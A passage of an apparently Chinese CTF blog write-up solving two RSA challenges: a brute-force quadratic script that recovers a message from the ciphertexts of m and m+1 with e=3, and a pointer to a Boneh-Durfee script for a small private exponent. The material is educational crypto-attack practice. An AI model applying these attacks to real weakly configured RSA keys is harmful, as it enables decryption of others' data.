<h3 id="challenge5"><a href="#challenge5" class="headerlink" title="challenge5"></a>challenge5</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge <span class="number">5</span></span><br><span class="line"></span><br><span class="line">[+]n=<span class="number">0x198f61bc7d2977139120b86b739afbd04e82726a7dcf514cc2ad46c7002d2202915ba932364d71b7dd1928fb6861f984d8d9e31e70d0023aca721130e1df2825568a623c8316fd555616d91897a2db5d1df973a1584ed4cfb0f55d910db5ff64a79f061ef71b2362b6c2af8416a5a47094aff428d6c541448df45436ec48f93L</span></span><br><span class="line"></span><br><span class="line">[+]e=<span class="number">3</span></span><br><span class="line">[+]m=random.getrandbits(<span class="number">512</span>)</span><br><span class="line">[+]c=pow(m,e,n)=<span class="number">0x13a5213f8946b3da1b37a7346f7985ed17329b05c31cc72912e15ab62c2b578f95148f7f2fb3daed063f5517efd9694d8a87792b675715d50d9113baa0bbfb1791f8e551ce5583c3dc31adf37dced9dab4acf3e58a5f3e203b1c971a746de5e9ac0b4d0153538f9392a0ce12250c5597eb23f07b4d7c84a084fc1dd0dee6b1cL</span></span><br><span class="line">[+]x=pow(m+<span class="number">1</span>,e,n)=<span class="number">0xa864c9ffa08edc2d2a380fde218fe07204193c43580ee0a3fd1505e3f60125c3f380fab24bbd344bca174f3b5b09ed271b817cb08fa6087f2b9d2216a1c7782714c50f475b0e3ca8b530ae33f4f4fb72c14ac0331b107d9dfcbbb193ac6946edd01e9cf5cab799a444dd9a49eb5362f6a499fa69540ac1d3dfbb977f57cd8eL</span></span><br></pre></td></tr></table></figure>
<p>爆破一元二次方程</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=<span class="number">0x198f61bc7d2977139120b86b739afbd04e82726a7dcf514cc2ad46c7002d2202915ba932364d71b7dd1928fb6861f984d8d9e31e70d0023aca721130e1df2825568a623c8316fd555616d91897a2db5d1df973a1584ed4cfb0f55d910db5ff64a79f061ef71b2362b6c2af8416a5a47094aff428d6c541448df45436ec48f93L</span></span><br><span class="line">c1=<span class="number">0x13a5213f8946b3da1b37a7346f7985ed17329b05c31cc72912e15ab62c2b578f95148f7f2fb3daed063f5517efd9694d8a87792b675715d50d9113baa0bbfb1791f8e551ce5583c3dc31adf37dced9dab4acf3e58a5f3e203b1c971a746de5e9ac0b4d0153538f9392a0ce12250c5597eb23f07b4d7c84a084fc1dd0dee6b1cL</span></span><br><span class="line">c2=<span class="number">0xa864c9ffa08edc2d2a380fde218fe07204193c43580ee0a3fd1505e3f60125c3f380fab24bbd344bca174f3b5b09ed271b817cb08fa6087f2b9d2216a1c7782714c50f475b0e3ca8b530ae33f4f4fb72c14ac0331b107d9dfcbbb193ac6946edd01e9cf5cab799a444dd9a49eb5362f6a499fa69540ac1d3dfbb977f57cd8eL</span></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">99999</span>):</span><br><span class="line">    c=<span class="number">1</span>-n*i+(c1-c2)</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">9</span><span class="number">-12</span>*c)&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> ((gmpy2.iroot(<span class="number">9</span><span class="number">-12</span>*c,<span class="number">2</span>)[<span class="number">0</span>]<span class="number">-3</span>)%<span class="number">6</span>==<span class="number">0</span>):</span><br><span class="line">            m=(gmpy2.iroot(<span class="number">9</span><span class="number">-12</span>*c,<span class="number">2</span>)[<span class="number">0</span>]<span class="number">-3</span>)/<span class="number">6</span></span><br><span class="line">            <span class="keyword">if</span> pow(m,e,n)==c1:</span><br><span class="line">                <span class="keyword">print</span> m</span><br></pre></td></tr></table></figure>
<h3 id="challenge6"><a href="#challenge6" class="headerlink" title="challenge6"></a>challenge6</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge <span class="number">6</span></span><br><span class="line">[+]n=<span class="number">0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L</span></span><br><span class="line">[+]d=random.getrandbits(<span class="number">1024</span>*<span class="number">0.270</span>)</span><br><span class="line">[+]e=invmod(d,phin)</span><br><span class="line">[+]hex(e)=<span class="number">0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bbL</span></span><br><span class="line">[+]m=random.getrandbits(<span class="number">512</span>)</span><br><span class="line">[+]c=pow(m,e,n)=<span class="number">0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866cL</span></span><br><span class="line">[-]long_to_bytes(m).encode(<span class="string">'hex'</span>)=</span><br></pre></td></tr></table></figure>
<p>Boneh and Durfee attack. </p>
<p>用这个脚本 <a href="https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage" target="_blank" rel="noopener">https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage</a></p>

                </section>

                
                
                


            
            <nav class="dis_flex al_post_nav">
                <a class="al_post_nav_item dis_flex_acenter" href="/2019/08/05/De1ctf-web/">
                    
                        <svg class="al_arrow">
                            <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-arrow-left"></use>
                        </svg>
                        <span class="al_text_ellipsis al_post_nav_desc">De1ctf_web</span>
                    
                </a>
                <a class="al_post_nav_item dis_flex_acenter" href="/2019/05/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/">
                    
                        <span class="al_text_ellipsis al_post_nav_desc">操作系统安全</span>
                        <svg class="al_arrow">
                            <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-arrow-right"></use>
                        </svg>
                    
                </a>
            </nav>
        </div>
    </div>


        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="al_index_footer dis_flex_center">



    
    

    <div class="al_index_footer_item al_index_footer_extra">
        Power By 
        <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>
    </div>

    <div class="al_index_footer_item al_index_footer_extra_right">
        All Right Reserved
    </div>
    <div class="al_index_footer_item al_index_footer_extra_right">
            本站总访问量<span id="busuanzi_value_site_pv"></span>次
    </div>
            
</div>

        <script type="text/javascript" async="async" src="/javascripts/acelog.js"></script>
        
        
        
    </body>
</html>
        